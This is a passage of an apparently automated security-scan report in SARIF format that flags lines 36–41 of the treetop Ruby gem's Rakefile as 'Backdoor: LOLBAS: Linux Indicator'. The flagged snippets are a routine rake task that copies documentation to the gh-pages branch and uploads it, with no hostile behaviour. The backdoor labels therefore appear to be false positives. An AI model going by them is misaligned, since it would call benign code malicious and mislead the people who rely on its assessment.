                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/Rakefile"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 3,
                  "endLine": 41,
                  "endColumn": 8,
                  "snippet": {
                    "text": "    rm -r doc\n    mv .doc-tmp doc\n    rake website upload\n    git checkout master\n  END\nend\n",
                    "rendered": {
                      "text": "    rm -r doc\n    mv .doc-tmp doc\n    rake website upload\n    git checkout master\n  END\nend\n",
                      "markdown": "`    rm -r doc\n    mv .doc-tmp doc\n    rake website upload\n    git checkout master\n  END\nend\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/Rakefile"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 3,
                  "endLine": 39,
                  "endColumn": 7,
                  "snippet": {
                    "text": "    cp -r doc .doc-tmp\n    git checkout gh-pages\n    rm -r doc\n    mv .doc-tmp doc\n    rake website upload\n    git checkout master\n  END\n",
                    "rendered": {
                      "text": "    cp -r doc .doc-tmp\n    git checkout gh-pages\n    rm -r doc\n    mv .doc-tmp doc\n    rake website upload\n    git checkout master\n  END\n",
                      "markdown": "`    cp -r doc .doc-tmp\n    git checkout gh-pages\n    rm -r doc\n    mv .doc-tmp doc\n    rake website upload\n    git checkout master\n  END\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/Rakefile"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 3,
                  "endLine": 37,
                  "endColumn": 8,
                  "snippet": {
                    "text": "  system <<-END\n    rm -rf .doc-tmp\n    cp -r doc .doc-tmp\n    git checkout gh-pages\n    rm -r doc\n    mv .doc-tmp doc\n    rake website upload\n",
                    "rendered": {
                      "text": "  system <<-END\n    rm -rf .doc-tmp\n    cp -r doc .doc-tmp\n    git checkout gh-pages\n    rm -r doc\n    mv .doc-tmp doc\n    rake website upload\n",
                      "markdown": "`  system <<-END\n    rm -rf .doc-tmp\n    cp -r doc .doc-tmp\n    git checkout gh-pages\n    rm -r doc\n    mv .doc-tmp doc\n    rake website upload\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/Rakefile"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 3,
                  "endLine": 36,
                  "endColumn": 7,
                  "snippet": {
                    "text": "task :website do\n  system <<-END\n    rm -rf .doc-tmp\n    cp -r doc .doc-tmp\n    git checkout gh-pages\n    rm -r doc\n    mv .doc-tmp doc\n",
                    "rendered": {
                      "text": "task :website do\n  system <<-END\n    rm -rf .doc-tmp\n    cp -r doc .doc-tmp\n    git checkout gh-pages\n    rm -r doc\n    mv .doc-tmp doc\n",
                      "markdown": "`task :website do\n  system <<-END\n    rm -rf .doc-tmp\n    cp -r doc .doc-tmp\n    git checkout gh-pages\n    rm -r doc\n    mv .doc-tmp doc\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}